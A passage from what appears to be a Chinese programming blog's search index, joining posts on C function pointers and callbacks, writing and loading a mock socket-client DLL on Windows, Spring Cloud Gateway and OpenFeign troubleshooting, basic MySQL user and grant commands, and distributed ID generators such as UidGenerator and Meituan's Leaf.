定义函数指针变量（会分配内存空间） int (*MyFuncPointVar)(int a, int b); MyFuncPointVar = add; int result3 = MyFuncPointVar(7, 9); printf("%d + %d = %d\\n", 7, 9, result3); return 0;} 程序运行的输出结果如下： 1231 + 3 = 44 + 5 = 97 + 9 = 16 函数类型与函数指针作为函数参数函数类型作为函数参数当函数类型做为函数的参数传递给一个被调用函数，被调用函数就可以通过这个函数类型调用外部的函数，这就形成了回调函数。C 语言回调函数的本质是，提前做了一个协议的约定（把函数的参数、函数的返回值类型提前约定）。 1234567891011121314151617181920212223242526272829303132#include &lt;stdio.h&gt;// 定义函数类型typedef int (MyFuncType)(int a, int b);int add(int a, int b) { return a + b;}int mult(int a, int b) { return a * b;}// 函数类型作为函数参数int callbackFunc(MyFuncType func) { return func(3, 6);}int main() { // 通过函数类型定义函数指针类型 MyFuncType* myFuncType = NULL; myFuncType = add; int result = callbackFunc(*myFuncType); printf("result = %d\\n", result); myFuncType = mult; int result2 = callbackFunc(*myFuncType); printf("result = %d\\n", result2); return 0;} 程序运行的输出结果如下： 12result = 9result = 18 函数指针作为函数参数当函数指针做为函数的参数传递给一个被调用函数，被调用函数就可以通过这个指针调用外部的函数，这就形成了回调函数。C 语言回调函数的本质是，提前做了一个协议的约定（把函数的参数、函数的返回值类型提前约定）。 a) 将 “函数的调用” 和 “函数的实现” 解耦 b) 可以模拟 C++ 的多态机制（提前布局 VPTR 指针和虚函数表，找虚函数入口地址来实现函数调用） 1234567891011121314151617181920212223242526272829#include &lt;stdio.h&gt;int add(int a, int b) { return a + b;}int mult(int a, int b) { return a * b;}// 函数指针做函数参数int callbackFunc(int (*MyFunc)(int a, int b)) { return MyFunc(3, 4);}int main() { // 定义函数指针变量 int (*myFuncVar)(int a, int b); myFuncVar = add; int result = callbackFunc(myFuncVar); printf("result = %d\\n", result); myFuncVar = mult; int result2 = callbackFunc(myFuncVar); printf("result = %d\\n", result2); return 0;} 程序运行的输出结果如下： 12result = 7result = 12 上述的 add、mult 函数都是写在同一个源文件当中，假如 add 函数是一个库中的函数，此时就只有使用回调了，通过函数指针参数将外部函数地址传入来实现调用。日后如果库里面的 add 函数的代码作了修改，也不必改动函数调用方的代码，就可以正常实现调用，便于程序的维护和升级。 DLL 动态链接库的使用下面将介绍 C/C++ 如何开发和调用一款 Socket 客户端的 DLL 动态链接库，该 DLL 主要实现了 Socket 客户端的初始化、报文发送、报文接收、资源释放等功能，第三方可以直接调用该 DLL 实现 Socket 通信。值得一提的是，本案例并没有真正完整地实现 Socket 客户端的底层代码，更多的是使用伪代码来模拟 Socket 客户端的通信。 运行环境说明这里给出的案例代码和操作步骤，只适用于 Windows 系统的 C/C++ 开发，且依赖 Visual Studio 开发工具，不适用于 Linux 系统的 C/C++ 开发。 DLL 项目的创建新建 DLL 项目 值得一提的是，通过 Visual Studio 创建 DLL（动态链接库）项目，源文件默认的后缀是 .cpp，如果项目使用的是 C 语言，则需要将自动生成的 dllmain.cpp、pch.cpp 的文件名改为 dllmain.c、pch.c。 编写 DLL 代码 创建 socketclient.c 源文件 socketclient.c 源文件的代码如下，其中 __declspec(dllexport) 的作用是将函数导出给 DLL 的调用方 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185#include "pch.h"#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;stdio.h&gt;// 定义函数指针类型，用于数据加密typedef int (*EncodeData)(unsigned char* in, int inlen, unsigned char* out, int* outlen);// 定义结构体typedef struct _Sck_Handle { char version[16]; char ip[16]; int port; unsigned char* p; int len; char* p2; EncodeData encodeCallback;} Sck_Handle;//客户端初始化__declspec(dllexport)int socketclient_init(void** handle) { int ret = 0; Sck_Handle* tmpHandle = NULL; if (handle == NULL) { ret = -1; printf("function socketclient_init() err :%d check params == NULL err \\n", ret); return ret; } tmpHandle = (Sck_Handle*)malloc(sizeof(Sck_Handle)); if (tmpHandle == NULL) { ret = -2; printf("function socketclient_init() err :%d malloc err \\n", ret); return ret; } memset(tmpHandle, 0, sizeof(Sck_Handle)); strcpy(tmpHandle-&gt;version, "1.0.0.1"); strcpy(tmpHandle-&gt;ip, "192.168.12.12"); tmpHandle-&gt;port = 8081; //间接赋值 *handle = tmpHandle; return ret;}//客户端报文发送__declspec(dllexport)int socketclient_send(void* handle, unsigned char* buf, int buflen) { int ret = 0; Sck_Handle* tmpHandle = NULL; if (handle == NULL || buf == NULL || buflen &lt;= 0) { ret = -2; printf("function socketclient_send() err :%d (handle == NULL || buf == NULL || buflen &lt;= 0 ) \\n", ret); return ret; } tmpHandle = (Sck_Handle*)handle; if (tmpHandle-&gt;encodeCallback == NULL) { //明文发送 tmpHandle-&gt;len = buflen; tmpHandle-&gt;p = (unsigned char*)malloc(buflen); if (tmpHandle-&gt;p == NULL) { ret = -2; printf("function socketclient_send() err :%d malloc len:%d \\n", ret, buflen); return ret; } memcpy(tmpHandle-&gt;p, buf, buflen); } else { //加密发送 unsigned char crypdata[4096]; int cryptdatalen = 4096; ret = tmpHandle-&gt;encodeCallback(buf, buflen, crypdata, &amp;cryptdatalen); if (ret != 0) { printf("function encodeCallback() err :%d \\n", ret); return ret; } tmpHandle-&gt;len = cryptdatalen; tmpHandle-&gt;p = (unsigned char*)malloc(cryptdatalen); if (tmpHandle-&gt;p == NULL) { ret = -1; printf("function socketclient_send() err :%d malloc len:%d \\n", ret, cryptdatalen); return ret; } memcpy(tmpHandle-&gt;p, crypdata, cryptdatalen); } return ret;}//客户端报文加密发送__declspec(dllexport)int socketclient_send_encode(void* handle, unsigned char* buf, int buflen, EncodeData encodeCallback) { int ret = 0; unsigned char cryptbuf[4096]; int cryptbuflen = 4096; Sck_Handle* tmpHandle = NULL; if (handle == NULL || buf == NULL || encodeCallback == NULL) { ret = -1; printf("function socketclient_send_encode() err :%d (handle == NULL || buf == NULL || encodeCallback == NULL) \\n", ret); return ret; } // 通过函数指针，执行数据的加密操作 ret = encodeCallback(buf, buflen, cryptbuf, &amp;cryptbuflen); if (ret != 0) { ret = -2; printf("function socketclient_send_encode() err :%d check encode_result == 0 err \\n", ret); return ret; } tmpHandle = (Sck_Handle*)handle; tmpHandle-&gt;len = cryptbuflen; tmpHandle-&gt;p = (unsigned char*)malloc(cryptbuflen); if (tmpHandle-&gt;p == NULL) { ret = -3; printf("function socketclient_send_encode() err :%d malloc len:%d \\n", ret, cryptbuflen); return ret; } //把加密的明文缓存到内存中 memcpy(tmpHandle-&gt;p, cryptbuf, cryptbuflen); return 0;}//客户端报文接收__declspec(dllexport)int socketclient_recv(void* handle, unsigned char* buf, int* buflen) { int ret = 0; Sck_Handle* tmpHandle = NULL; if (handle == NULL || buf == NULL || buflen == NULL) { ret = -2; printf("function socketclient_recv() err :%d (handle == NULL || buf == NULL || buflen == NULL ) \\n", ret); return ret; } tmpHandle = (Sck_Handle*)handle; memcpy(buf, tmpHandle-&gt;p, tmpHandle-&gt;len); *buflen = tmpHandle-&gt;len; return ret;}//客户端资源释放__declspec(dllexport)int socketclient_destory(void* handle) { int ret = 0; Sck_Handle* tmpHandle = NULL; if (handle == NULL) { return -1; } tmpHandle = (Sck_Handle*)handle; if (tmpHandle-&gt;p != NULL) { free(tmpHandle-&gt;p); //释放结构体成员域的指针所指向的内存空间 } free(tmpHandle); //释放结构体内存 handle = NULL; return 0;}//设置加密回调函数__declspec(dllexport)int socketclient_set_encode_callback(void* handle, EncodeData encodeCallback) { int ret = 0; Sck_Handle* tmpHandle = NULL; if (handle == NULL || encodeCallback == NULL) { ret = -1; printf("function socketclient_set_encode_callback() err :%d check (handle == NULL || encodeCallback == NULL) err \\n", ret); return ret; } tmpHandle = (Sck_Handle*)handle; tmpHandle-&gt;encodeCallback = encodeCallback; return 0;} 生成 DLL 文件DLL 项目执行编译后，会自动在项目所在的文件夹内生成 .dll 与 .lib 文件，例如 socket-client.dll 与 socket-client.lib。在 VS Studio 的 Developer Command Prompt 命令窗口中，使用 dumpbin /exports socket-client.dll 命令，查看得到 socket-client.dll 动态链接库的详细信息如下： 12345678910111213141516171819202122232425262728293031323334353637Microsoft (R) COFF/PE Dumper Version 14.29.30136.0Copyright (C) Microsoft Corporation. All rights reserved.Dump of file socket-client.dllFile Type: DLL Section contains the following exports for socket-client.dll 00000000 characteristics FFFFFFFF time date stamp 0.00 version 1 ordinal base 6 number of functions 6 number of names ordinal hint RVA name 1 0 00011005 socketclient_destory = @ILT+0(socketclient_destory) 2 1 0001135C socketclient_init = @ILT+855(socketclient_init) 3 2 00011055 socketclient_recv = @ILT+80(socketclient_recv) 4 3 00011195 socketclient_send = @ILT+400(socketclient_send) 5 4 000112E4 socketclient_send_encode = @ILT+735(socketclient_send_encode) 6 5 00011244 socketclient_set_encode_callback = @ILT+575(socketclient_set_encode_callback) Summary 1000 .00cfg 1000 .data 1000 .idata 1000 .msvcjmc 3000 .pdata 4000 .rdata 1000 .reloc 1000 .rsrc 9000 .text 10000 .textbss 案例代码下载 点击下载完整的案例代码 DLL 的两种调用方式DLL 动态调用在本案例中，实现了通过函数指针类型，动态调用 DLL 里的函数，点击下载 使用到的 socket-client.dll 。值得一提的是，日后如果 DLL 里面的函数体代码作了修改，也不必改动函数调用方的代码（如下代码），就可以正常实现函数的调用，这样非常便于程序的维护和升级。特别注意，动态调用 DLL 里的函数时（动态加载 DLL），不需要 .h 和 .lib 文件，只需要 .dll 文件，同时要知道所要调用的函数的参数类型以及返回值类型（用于定义函数指针类型）。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455#include &lt;stdio.h&gt;#include &lt;windows.h&gt;// 定义函数指针类型typedef int (*SocketInit)(void** handle);typedef int (*SocketSend)(void* handle, unsigned char* buf, int buflen);typedef int (*SocketRev)(void* handle, unsigned char* buf, int* buflen);typedef int (*SocketDestory)(void* handle);int main() { HINSTANCE hInstance; // 加载DLL动态链接库 hInstance = LoadLibrary("./socket-client.dll"); if (hInstance == NULL) { printf("LoadLibrary() 调用失败, ErrorCode: %d", GetLastError()); return -1; } // 调用DLL动态链接库 SocketInit socketInit = (SocketInit)GetProcAddress(hInstance, "socketclient_init"); SocketSend socketSend = (SocketSend)GetProcAddress(hInstance, "socketclient_send"); SocketRev socketRev = (SocketRev)GetProcAddress(hInstance, "socketclient_recv"); SocketDestory socketDestory = (SocketDestory)GetProcAddress(hInstance, "socketclient_destory"); if (socketInit == NULL) { return -1; } unsigned char inbuf[128]; int inbuflen = 128; unsigned char outbuf[4096]; int outbuflen = 4096; void* handle = NULL; int initResult = socketInit(&amp;handle); int sendResult = socketSend(handle, inbuf, inbuflen); int revResult = socketRev(handle, outbuf, &amp;outbuflen); int destoryResult = socketDestory(handle); printf("initResult = %d\\n", initResult); printf("sendResult = %d\\n", sendResult); printf("revResult = %d\\n", revResult); printf("destoryResult = %d\\n", destoryResult); // 释放DLL动态链接库 if (hInstance != NULL) { FreeLibrary(hInstance); } return 0;} 程序运行的输出结果如下： 1234initResult = 0sendResult = 0revResult = 0destoryResult = 0 DLL 静态调用静态调用 DLL 里的函数（静态加载 DLL），需要同时使用 .h、.lib 以及 .dll 文件，具体的操作步骤如下： a) 将 .h、.lib 以及 .dll 文件分别拷贝到项目所在的文件夹内，必须与 .c 源文件处于同一个文件夹 b) 在需要调用 DLL 的 .c 源文件中，通过 #pragma comment(lib "xxx.lib") 指令引入 .lib 文件 c) 在需要调用 DLL 的 .c 源文件中，通过 #include "xxx.h，引入 .h 头文件 d) 正常编写代码，并调用 DLL 里的函数 若使用的开发工具是 Visual Studio，则可以不通过 #pragma comment(lib "xxx.lib") 指令引入 .lib 文件。右键项目，选择 属性，导航到 配置属性 -&gt; 链接器 -&gt; 输入 -&gt; 附加依赖项，添加对应的 .lib 文件名即可，如下图所示： .h 头文件里一般定义了 DLL 动态链接库里的函数原型，例如 socket-client.h 头文件的代码如下： 123456789101112131415161718192021#ifndef _INC_MYSOCKETCLIENT_H__#define _INC_MYSOCKETCLIENT_H__#ifdef __cplusplusextern "C" {#endif typedef int (*EncodeData)(unsigned char* in, int inlen, unsigned char* out, int* outlen); int socketclient_init(void** handle); int socketclient_send(void* handle, unsigned char* buf, int buflen); int socketclient_recv(void* handle, unsigned char* buf, int* buflen); int socketclient_destory(void* handle); int socketclient_set_encode_callback(void* handle, EncodeData encodeCallback); int socketclient_send_encode(void* handle, unsigned char* buf, int buflen, EncodeData encodeCallback);#ifdef __cplusplus}#endif#endif /* _INC_MYSOCKETCLIENT_H__ */ 静态调用 DLL 里的函数（main.c）的代码如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include "socket-client.h"int Hw_Encode(unsigned char* in, int inlen, unsigned char* out, int* outlen) { printf("function Hw_Encode() begin ....\\n"); strcpy((char*)out, "123456789"); *outlen = 9; printf("function Hw_Encode() end ....\\n"); return 0;}int Cisco_Encode(unsigned char* in, int inlen, unsigned char* out, int* outlen) { printf("function Cisco_Encode() begin ....\\n"); strcpy((char*)out, "123456789"); *outlen = 9; printf("function Cisco_Encode() end ....\\n"); return 0;}int main() { unsigned char in[1024]; int inlen; unsigned char out[1024]; int outlen; void* handle = NULL; int ret = 0; strcpy((char*)in, "aaaaaaaa"); inlen = 9; //客户端初始化 ret = socketclient_init(&amp;handle); if (ret != 0) { printf("function socketclient_init() err:%d \\n", ret); goto End; } printf("the result of socketclient_init() is %d \\n", ret); //设置加密回调函数 ret = socketclient_set_encode_callback(handle, Cisco_Encode); if (ret != 0) { printf("function socketclient_set_encode_callback() err:%d \\n", ret); } printf("the result of socketclient_set_encode_callback() is %d \\n", ret); //客户端发送报文 ret = socketclient_send(handle, in, inlen); if (ret != 0) { printf("function socketclient_send() err:%d \\n", ret); goto End; } printf("the result of socketclient_send() is %d \\n", ret); //客户端报文加密发送 ret = socketclient_send_encode(handle, in, inlen, Hw_Encode); if (ret != 0) { printf("function socketclient_send_encode() err:%d \\n", ret); goto End; } printf("the result of socketclient_send_encode() is %d \\n", ret); //客户端接收报文 ret = socketclient_recv(handle, out, &amp;outlen); if (ret != 0) { printf("function socketclient_recv() err:%d \\n", ret); goto End; } printf("the result of socketclient_recv() is %d \\n", ret);End: //客户端释放资源 ret = socketclient_destory(handle); if (ret != 0) { printf("function socketclient_destory() err:%d \\n", ret); } printf("the result of socketclient_destory() is %d \\n", ret); return 0;} 程序运行的输出结果如下： 12345678910the result of socketclient_init() is 0the result of socketclient_set_encode_callback() is 0function Cisco_Encode() begin ....function Cisco_Encode() end ....the result of socketclient_send() is 0function Hw_Encode() begin ....function Hw_Encode() end ....the result of socketclient_send_encode() is 0the result of socketclient_recv() is 0the result of socketclient_destory() is 0 案例代码下载 点击下载完整的案例代码（DLL 静态调用） 参考博客 C++ 动态加载 DLL 和静态加载 DLL，以及 DLL 的编写 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"c语言"},{title:"Spring Cloud Gateway 开发随笔",url:"/posts/a6f0aaf9.html",text:'Gateway 配置路由超时时间配置路由超时配置可以为所有路由配置 HTTP 超时（响应和连接），并为每个特定路由覆盖 HTTP 超时。 全局路由的超时时间配置配置全局 HTTP 超时（响应和连接），需要使用以下两个参数： connect-timeout：必须以毫秒为单位指定连接超时时间 response-timeout：必须指定为 java.time.Duration 123456spring: cloud: gateway: httpclient: connect-timeout: 1000 response-timeout: 5s 每个路由的超时时间配置可以通过路由的 metadata 以下两个参数配置每个路由的超时时间： connect-timeout：必须以毫秒为单位指定连接超时时间 response-timeout：必须以毫秒为单位指定响应超时时间 123456789- id: per_route_timeouts uri: https://example.org predicates: - name: Path args: pattern: /delay/{timeout} metadata: response-timeout: 1000 connect-timeout: 1000 使用 Java DSL 为每个路由配置超时时间123456789101112131415import static org.springframework.cloud.gateway.support.RouteMetadataUtils.CONNECT_TIMEOUT_ATTR;import static org.springframework.cloud.gateway.support.RouteMetadataUtils.RESPONSE_TIMEOUT_ATTR;@Beanpublic RouteLocator customRouteLocator(RouteLocatorBuilder routeBuilder){ return routeBuilder.routes() .route("test1", r -&gt; { return r.host("*.somehost.org").and().path("/somepath") .filters(f -&gt; f.addRequestHeader("header1", "header-value-1")) .uri("http://someuri") .metadata(RESPONSE_TIMEOUT_ATTR, 1000) .metadata(CONNECT_TIMEOUT_ATTR, 1000); }) .build();} Gateway 负载均衡负载均衡失效，响应 503 错误码 版本说明 Spring Boot Spring Cloud Spring Cloud Alibaba 2.6.3 2021.0.1 2021.0.1.0 Gateway 的配置 12345678910111213spring: cloud: nacos: discovery: server-addr: 192.168.56.103:8848 gateway: routes: - id: tmall-product uri: lb://tmall-product predicates: - Path=/api/** filters: - RewritePath=/api(?&lt;segment&gt;/?.*), /tmall-product/$\\{segment} 问题描述 Gateway 使用 Nacos 作为配置中心，基于上述的配置内容，当通过 uri: http://127.0.0.1:9090 去直接调用 tmall-product 服务时，是可以正常调用的，但是使用 uri: lb://tmall-product 时就无法调用服务，Gateway 返回 503 错误码。 解决方案 造成 Gateway 负载均衡失效的原因是，从 Spring Cloud 2020 版本开始，Spring Cloud 弃用了 Ribbon，使用 Spring Cloud Loadbalancer 作为客户端的负载均衡组件；因此 Spring Cloud Alibaba 在 2021 版本的 Nacos 中也移除了 Ribbon 的依赖，最终导致 Gateway 无法通过 lb:// 路由到指定的服务，继而出现了 503 错误码。解决方案是引入 Spring Cloud Loadbalancer 的 Maven 坐标即可： 1234&lt;dependency&gt; &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt; &lt;artifactId&gt;spring-cloud-loadbalancer&lt;/artifactId&gt;&lt;/dependency&gt; var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"微服务 开发随笔"},{title:"OpenFeign 开发随笔",url:"/posts/9becbc39.html",text:'常见错误Request method ‘POST’ not supported 错误信息：在调用 OpenFeign 下面这段代码时，抛出了 Request method \'POST\' not supported 的异常 12345678910/** * 服务调用方 */@FeignClient(name = MicroServiceName.WECHAT_SERVICE)public interface WechatSubscribeUserService { @RequestMapping(value = "/wechat/subscribe/get", method = RequestMethod.GET) WechatSubscribeUser getSubscribeUser(@RequestBody WechatSubscribeUserVo vo);} 123456789101112131415161718/** * 服务提供方 */@RestController@RequestMapping("/wechat/subscribe")public class WechatSubscribeUserController { @Autowired private WechatSubscribeUserService subscribeUserService; @GetMapping("/get") public WechatSubscribeUser get(WechatSubscribeUserVo vo) { String toOpenId = vo.getToOpenId(); String fromOpenId = vo.getFromOpenId(); return subscribeUserService.getUser(fromOpenId, toOpenId); }} 错误原因：OpenFeign 原生的连接工具默认使用了 JDK 中的 HttpURLConnection 类进行实现，下面这段代码是在 HttpURLConnection 中发现的，所以只要 HTTP 请求里有 Body 体对象，就会强制的把 GET 请求转换成 POST 请求。 1234567891011private synchronized OutputStream getOutputStream0() throws IOException { try { if (!this.doOutput) { throw new ProtocolException("cannot write to a URLConnection if doOutput=false - call setDoOutput(true)"); } else { if (this.method.equals("GET")) { this.method = "POST"; } } }} 第一种解决方案：不使用 POJO 对象作为参数，而是传入多个独立的参数，并添加 @RequestParam 注解 12345678910/** * 服务调用方 */@FeignClient(name = MicroServiceName.WECHAT_SERVICE)public interface WechatSubscribeUserService { @RequestMapping(value = "/wechat/subscribe/get", method = RequestMethod.GET) WechatSubscribeUser getSubscribeUser(@RequestParam("fromOpenId") String fromOpenId, @RequestParam("toOpenId") String toOpenId);} 第二种解决方案：使用 POJO 对象作为参数，同时添加 @SpringQueryMap 注解 12345678910/** * 服务调用方 */@FeignClient(name = MicroServiceName.WECHAT_SERVICE)public interface WechatSubscribeUserService { @RequestMapping(value = "/wechat/subscribe/get", method = RequestMethod.GET) WechatSubscribeUser get(@SpringQueryMap WechatSubscribeUserVo vo);} 提示 Feign 的 @QueryMap 注解支持将 POJO 用作 GET 请求的参数映射，但默认的 @QueryMap 注解与 Spring 不兼容，因为它缺少 value 属性。Spring Cloud OpenFeign 提供了等效的 @SpringQueryMap 注解，用于将 POJO 或 Map 参数映射为查询参数。简而言之，Feign 的 GET 请求无法解析对象参数，如果传参是一个类对象，框架就需要把这个类对象解析成查询参数，但是直接在方法中传参框架不会自动把类对象解析成查询参数。@SpringQueryMap 注解的作用就是把 POJO 解析成 k1=v1&amp;k2=v2 的查询参数格式。 第三种解决方案：使用 Apache HttpClient 或者 OkHttp 替换掉 OpenFeign 原生使用的 HttpURLConnection 连接工具，然后添加 @RequestBody 注解 12345678910/** * 服务调用方 */@FeignClient(name = MicroServiceName.WECHAT_SERVICE)public interface WechatSubscribeUserService { @RequestMapping(value = "/wechat/subscribe/get", method = RequestMethod.GET) WechatSubscribeUser getSubscribeUser(@RequestBody WechatSubscribeUserVo vo);} warning笔者尝试使用 Apache HttpClient 或者 OkHttp 替换 OpenFeign 默认使用的 HttpURLConnection，但并没有生效，有兴趣的可以参考这里的 替换教程。 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"微服务 开发随笔"},{title:"MySQL 常用命令",url:"/posts/31eec5f6.html",text:'用户管理创建用户创建普通用户，并完全授权访问特定的数据库 12345create user \'clay\'@\'%\' identified by \'123456\';grant all privileges on mysql_db.* to \'clay\'@\'%\';flush privileges; 删除用户删除用户及权限 1drop user \'clay\'@\'%\'; 创建只读用户创建普通用户，并授予特定数据库的只读权限 123grant select on mysql_db.* to \'clay\'@\'%\' identified by \'123456\';flush privileges; 权限管理查看用户的所有权限1show grants for \'clay\'@\'%\'; 授权 Root 用户远程登录*.* 代表所有数据库所有权限，\'root\'@\'%\' 中的 root 代表用户名，% 代表所有的访问地址，123456 是登录密码 123GRANT ALL PRIVILEGES ON *.* TO \'root\'@\'%\' IDENTIFIED BY \'123456\' WITH GRANT OPTION;FLUSH PRIVILEGES; var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"数据库"},{title:"分布式唯一全局 ID 解决方案之二",url:"/posts/221613dd.html",text:'大纲 分布式唯一全局 ID 解决方案之一 分布式唯一全局 ID 解决方案之二 1、UidGenerator 分布式 ID 生成器1.1、概述UidGenerator 是 Java 实现的，基于 Snowflake 算法的唯一 ID 生成器。UidGenerator 以组件形式工作在应用项目中， 支持自定义 workerId 位数和初始化策略， 从而适用于 Docker 等虚拟化环境下实例自动重启、漂移等场景。在实现上， UidGenerator 通过借用未来时间来解决 sequence 天然存在的并发限制；采用 RingBuffer 来缓存已生成的 UID， 并行化 UID 的生产和消费， 同时对 CacheLine 补齐，避免了由 RingBuffer 带来的硬件级「伪共享」问题。 最终单机 QPS 可达 600 万。依赖 Java8 及以上版本， MySQL (内置 WorkerID 分配器， 启动阶段通过数据库进行分配；如自定义实现，则数据库非必选依赖）。 1.2、结构Snowflake 算法描述：指定机器 &amp; 同一时刻 &amp; 某一并发序列，是唯一的。据此可生成一个 64 bit 的唯一 ID（Long 型），默认采用下图字节分配方式： sign（1bit）：符号位，固定是 0，表示全部 ID 都是正整数 delta seconds (28 bits)：当前时间，相对于时间基点 2016-05-20 的增量值，单位为秒，最多可支持约 8.7 年 worker id (22 bits)：机器 ID，最多可支持约 420w 次机器启动。内置实现为在启动时由数据库分配，默认分配策略为用后即弃，后续可提供复用策略 sequence (13 bits)：每秒下的并发序列，13 bits 可支持每秒 8192 个并发 2、Leaf 分布式 ID 生成系统Leaf 提供了两种方案，分别是 Leaf-segment 和 Leaf-snowflake 方案，前者依赖 MySQL，后者依赖 ZooKeeper。 2.1、Leaf-segment 方案2.1.1、概述Leaf-segment 方案，在使用 MySQL 自增 ID 的方案上，做了如下改变： 原方案每次获取 ID 都得读写一次数据库，造成数据库压力大。改为利用 Proxy Server 批量获取，每次获取一个 segment（step 决定大小）号段的值。用完之后再去数据库获取新的号段，可以大大的减轻数据库的压力 各个业务不同的 ID 生成需求用 biz_tag 字段来区分，每个 biz-tag 的 ID 获取相互隔离，互不影响。如果以后有性能需求需要对数据库扩容，不需要上述复杂的扩容操作，只需要对 biz_tag 分库分表就行 123456789+-------------+--------------+------+-----+-------------------+-----------------------------+| Field | Type | Null | Key | Default | Extra |+-------------+--------------+------+-----+-------------------+-----------------------------+| biz_tag | varchar(128) | NO | PRI | | || max_id | bigint(20) | NO | | 1 | || step | int(11) | NO | | NULL | || desc | varchar(256) | YES | | NULL | || update_time | timestamp | NO | | CURRENT_TIMESTAMP | on update CURRENT_TIMESTAMP |+-------------+--------------+------+-----+-------------------+-----------------------------+ 重要字段说明： biz_tag：用来区分业务 max_id：表示该 biz_tag 目前所被分配的 ID 段的最大值 step：表示每次分配的号段长度。原来获取 ID 每次都需要写数据库，现在只需要把 step 设置得足够大，比如 1000。那么只有当 1000 个号被消耗完了之后才会去重新读写一次数据库，读写数据库的频率从 1 减小到了 1 / step 2.1.2、架构 test_tag 在第一台 Leaf 机器上是 11000 的号段，当这个号段用完时，会去加载另一个长度为 step=1000 的号段，假设另外两台号段都没有更新，这个时候第一台机器新加载的号段就应该是 30014000。同时数据库对应的 biz_tag 这条数据的 max_id 会从 3000 被更新成 4000，更新号段的 SQL 语句如下： 1234BeginUPDATE table SET max_id=max_id+step WHERE biz_tag=xxxSELECT tag, max_id, step FROM table WHERE biz_tag=xxxCommit 2.1.3、优缺点优点： Leaf 服务可以很方便的线性扩展，性能完全能够支撑大多数业务场景 ID 是趋势递增的 8 byte 的 64 位数字，满足上述数据库存储的主键要求 可以自定义 max_id 的大小，非常方便业务从原有的 ID 方式上迁移过来 容灾性高，Leaf 服务内部有号段缓存，即使数据库宕机，短时间内 Leaf 仍能正常对外提供服务 缺点： 数据库宕机会造成整个系统不可用 ID 不够随机，能够泄露发号数量的信息，不太安全 TP999 数据波动大，当号段使用完之后，ID 生成的性能瓶颈还是会在更新数据库的 I/O 上，TP999 数据会出现偶尔的尖刺 2.1.4、高可用容灾针对第一个缺点数据库可用性问题，目前采用一主两从的方式，同时分机房部署，Master 和 Slave 之间采用半同步方式同步数据。同时使用 Atlas 数据库中间件（已开源，改名为 DBProxy）做主从切换。当然这种方案在一些情况会退化成异步模式，甚至在非常极端情况下仍然会造成数据不一致的情况，但是出现的概率非常小。如果系统要保证 100% 的数据强一致，可以选择使用 类 Paxos 算法 实现的强一致 MySQL 方案，如 MySQL 5.7 GA 的 MySQL Group Replication，但是运维成本和精力都会相应的增加，根据实际情况选型即可。在美团点评内部，Leaf 服务分 IDC 部署，内部的服务化框架是 MTthrift RPC。服务调用的时候，根据负载均衡算法会优先调用同机房的 Leaf 服务。在该 IDC 内 Leaf 服务不可用的时候才会选择其他机房的 Leaf 服务。同时服务治理平台 OCTO 还提供了针对服务的过载保护、一键截流、动态流量分配等对服务的保护措施。 2.1.5、双 Buffer 优化针对上述第三个缺点，Leaf-segment 做了一些优化，简单的说就是：Leaf 取号段的时机是在号段消耗完的时候进行的，也就意味着号段临界点的 ID 